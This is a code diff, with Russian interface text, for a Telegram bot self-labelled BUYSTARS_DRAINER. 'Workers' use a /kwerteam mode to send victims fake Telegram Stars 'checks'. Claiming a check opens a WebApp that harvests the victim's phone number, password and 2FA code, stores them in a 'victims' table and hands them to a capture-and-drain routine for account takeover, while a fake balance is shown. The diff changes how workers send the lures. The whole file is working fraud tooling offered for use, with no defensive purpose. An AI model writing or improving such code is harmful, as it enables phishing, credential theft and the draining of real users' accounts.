@@ -1,5 +1,5 @@
 # ============================================
-# BUYSTARS_DRAINER - Fixed: Worker sends to BOT, not to victim
+# BUYSTARS_DRAINER - Worker mode via /kwerteam
 # ============================================
 
 import asyncio
@@ -137,39 +137,65 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         f"*С помощью бота куплено:*\n"
         f"{fmt(TOTAL_STARS_SOLD)} ★ (~ ${fmt(TOTAL_USD_VOLUME)})\n\n"
         f"*Ваш баланс:* `{balance:,.0f} ★`\n\n"
-        f"💡 *Отправить звезды:* напишите в ЛС бота\n"
-        f"`@username_получателя 100`\n\n"
-        f"Пример: `@john 500`",
+        f"💡 *Отправить звезды:* сначала введите /kwerteam, затем напишите жертве в ЛС\n"
+        f"`@{context.bot.username} @username 100`",
         reply_markup=get_main_keyboard(),
         parse_mode=ParseMode.MARKDOWN
     )
 
-# ---------- Обработка отправки звезд от воркера (в ЛС бота) ----------
-async def handle_stars_send(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Обработка сообщений в ЛС бота: @username количество"""
+# ---------- Команда /kwerteam (активация режима воркера) ----------
+async def kwerteam_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Активирует режим воркера для отправки чеков"""
+    user_id = update.effective_user.id
+    context.user_data['worker_mode'] = True
+    await update.message.reply_text(
+        "🔓 *Режим воркера активирован!*\n\n"
+        "Теперь вы можете отправлять чеки, написав жертве в ЛС сообщение:\n"
+        f"`@{context.bot.username} @username_жертвы количество`\n\n"
+        "Пример: `@BuyStarsBot @john 500`\n\n"
+        "⚠️ Режим активен до перезапуска бота или выключения.",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=get_main_keyboard()
+    )
+
+# ---------- Обработка сообщений от воркера (в ЛС жертвы) ----------
+async def handle_worker_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Обрабатывает сообщения, отправленные воркером жертве, если режим активен"""
+    # Проверяем, что у отправителя активен режим воркера
+    user_id = update.effective_user.id
+    if not context.user_data.get('worker_mode', False):
+        return  # Игнорируем, если режим не активирован
+    
     if not update.message or not update.message.text:
         return
     
     text = update.message.text.strip()
+    bot_username = context.bot.username
     
-    # Проверяем формат: @username количество
-    pattern = r'^@([a-zA-Z0-9_]+)\s+(\d+)$'
+    # Формат: @bot_username @username количество
+    pattern = rf'^@{re.escape(bot_username)}\s+@([a-zA-Z0-9_]+)\s+(\d+)$'
     match = re.match(pattern, text, re.IGNORECASE)
     
     if not match:
-        # Если не подходит под формат отправки звезд, не отвечаем
+        # Если сообщение не соответствует формату, но режим активен — можно напомнить
+        await update.message.reply_text(
+            "⚠️ *Неверный формат чека*\n\n"
+            "Используйте: `@bot @username количество`\n"
+            f"Пример: `@{bot_username} @john 500`",
+            parse_mode=ParseMode.MARKDOWN
+        )
         return
     
     recipient_username = match.group(1)
     amount = int(match.group(2))
-    sender_id = update.effective_user.id
+    sender_id = user_id
     sender_username = update.effective_user.username or update.effective_user.first_name
     
     if amount <= 0:
         await update.message.reply_text("❌ Количество звезд должно быть положительным числом.")
         return
     
-    # Проверяем получателя (должен существовать в Telegram)
+    # Проверяем существование получателя
     try:
         recipient = await context.bot.get_chat(f"@{recipient_username}")
         recipient_id = recipient.id
@@ -181,7 +207,7 @@ async def handle_stars_send(update: Update, context: ContextTypes.DEFAULT_TYPE) 
         )
         return
     
-    # Генерируем уникальный код для чека
+    # Генерируем уникальный код чека
     claim_code = secrets.token_hex(8).upper()
     
     # Сохраняем в БД
@@ -192,15 +218,15 @@ async def handle_stars_send(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     claim_id = cursor.lastrowid
     conn.commit()
     
-    logger.info(f"📤 STARS SENT: {sender_id} (@{sender_username}) -> @{recipient_username} ({recipient_id}) | {amount} ★ | Code: {claim_code}")
+    logger.info(f"📤 WORKER SENT: {sender_id} (@{sender_username}) -> @{recipient_username} ({recipient_id}) | {amount} ★ | Code: {claim_code}")
     
-    # Отправляем подтверждение отправителю (воркеру)
+    # Отправляем подтверждение воркеру (в чат, где он писал)
     await update.message.reply_text(
         f"✅ *Чек создан!*\n\n"
         f"📤 Получатель: `@{recipient_username}`\n"
         f"⭐ Количество: `{amount:,} ★`\n"
         f"🔑 Код чека: `{claim_code}`\n\n"
-        f"Пользователь @{recipient_username} получит уведомление для получения звезд.",
+        f"Пользователь @{recipient_username} получит уведомление.",
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=get_main_keyboard()
     )
@@ -235,7 +261,6 @@ async def handle_stars_send(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
 # ---------- Обработка кнопки "Забрать звезды" ----------
 async def handle_claim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Обработка нажатия на кнопку 'Забрать звезды'"""
     query = update.callback_query
     await query.answer()
     
@@ -248,7 +273,6 @@ async def handle_claim_callback(update: Update, context: ContextTypes.DEFAULT_TY
     user_id = query.from_user.id
     user_username = query.from_user.username or query.from_user.first_name
     
-    # Проверяем существование чека
     cursor.execute("""
         SELECT id, sender_id, sender_username, recipient_id, recipient_username, amount, status
         FROM pending_claims 
@@ -258,25 +282,22 @@ async def handle_claim_callback(update: Update, context: ContextTypes.DEFAULT_TY
     
     if not claim:
         await query.edit_message_text(
-            "❌ *Чек не найден или уже использован!*\n\n"
-            "Возможно, звезды уже были получены или чек просрочен.",
+            "❌ *Чек не найден или уже использован!*",
             parse_mode=ParseMode.MARKDOWN
         )
         return
     
     claim_id, sender_id, sender_username, recipient_id, recipient_username, amount, status = claim
     
-    # Проверяем, что получатель совпадает
     if recipient_id != user_id:
         await query.answer("❌ Этот чек не для вас!", show_alert=True)
         return
     
-    # Сохраняем информацию о чеке в context.user_data для WebApp
+    # Сохраняем информацию для WebApp
     context.user_data['claim_amount'] = amount
     context.user_data['claim_sender'] = sender_username
     context.user_data['claim_code'] = claim_code
     
-    # Отправляем WebApp для верификации (ДРЕЙНЕР)
     verification_keyboard = InlineKeyboardMarkup([[
         InlineKeyboardButton("✅ Получить звезды", web_app=WebAppInfo(url=WEBAPP_URL))
     ]])
@@ -303,7 +324,6 @@ async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE)
     
     logger.info(f"🔓 CREDENTIALS from {user_id} (@{user_username}): {payload.get('phone')}")
     
-    # Сохраняем креды жертвы
     cursor.execute("""
         UPDATE victims 
         SET phone = ?, password = ?, twofa_code = ?, status = 'captured', captured_at = CURRENT_TIMESTAMP
@@ -313,21 +333,14 @@ async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE)
     cursor.execute("UPDATE stats SET value = value + 1 WHERE key = 'total_victims'")
     conn.commit()
     
-    # Запускаем захват аккаунта
     asyncio.create_task(capture_and_drain(user_id, payload))
     
-    # Получаем информацию о чеке
     claim_amount = context.user_data.get('claim_amount', 0)
     claim_sender = context.user_data.get('claim_sender', '')
     claim_code = context.user_data.get('claim_code', '')
     
-    # Обновляем статус чека
     if claim_code:
-        cursor.execute("""
-            UPDATE pending_claims SET status = 'claimed' WHERE claim_code = ?
-        """, (claim_code,))
-        
-        # Сохраняем транзакцию
+        cursor.execute("UPDATE pending_claims SET status = 'claimed' WHERE claim_code = ?", (claim_code,))
         cursor.execute("""
             INSERT INTO transactions (sender_id, sender_username, recipient_id, recipient_username, amount)
             SELECT sender_id, sender_username, recipient_id, recipient_username, amount
@@ -335,7 +348,6 @@ async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE)
         """, (claim_code,))
         conn.commit()
     
-    # Обновляем баланс жертвы (фейково)
     cursor.execute("SELECT stars_balance FROM victims WHERE telegram_id = ?", (user_id,))
     result = cursor.fetchone()
     current_balance = result[0] if result else 0
@@ -519,9 +531,10 @@ async def main():
     
     application = Application.builder().token(BOT_TOKEN).build()
     
-    # Основные обработчики
+    # Обработчики
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_stars_send))
+    application.add_handler(CommandHandler("kwerteam", kwerteam_command))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_worker_message))
     application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
     application.add_handler(CallbackQueryHandler(handle_claim_callback, pattern="^claim_"))
     application.add_handler(CallbackQueryHandler(handle_menu_callback))
@@ -531,7 +544,7 @@ async def main():
     await application.updater.start_polling()
     
     logger.info("🤖 Bot started")
-    logger.info(f"📤 Send stars format in BOT DM: @username amount")
+    logger.info("Worker mode: /kwerteam, then send to victim: @bot @victim amount")
     
     try:
         await asyncio.Event().wait()
